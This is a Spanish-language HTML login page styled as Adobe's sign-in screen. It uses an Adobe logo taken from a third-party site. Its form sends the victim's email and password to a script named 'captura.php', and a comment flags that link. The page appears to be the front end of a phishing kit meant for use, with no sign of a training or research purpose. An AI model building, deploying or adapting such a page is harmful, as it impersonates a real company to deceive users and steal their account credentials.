<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Iniciar sesión - Adobe</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <div class="logo">
        <img src="https://1000marcas.net/wp-content/uploads/2020/01/Adobe-Logo-1-1536x864.png" alt="Logo Adobe" width="200">
      </div>
      <h2>Iniciar sesión</h2>
      
      <!-- FORMULARIO CONECTADO A captura.php -->
      <form id="loginForm" action="captura.php" method="POST">
        <label for="email">Correo electrónico</label>
        <input type="email" id="email" name="email" placeholder="tucorreo@ejemplo.com" required />

        <label for="password">Contraseña</label>
        <input type="password" id="password" name="password" placeholder="••••••••" required />

        <button type="submit">Iniciar sesión</button>
      </form>

      <div class="links">
        <a href="forgotPassword.html">¿Olvidaste tu contraseña?</a>
        <a href="createAccount.html">Crear cuenta</a>
      </div>
    </div>
  </div>
</body>
</html>
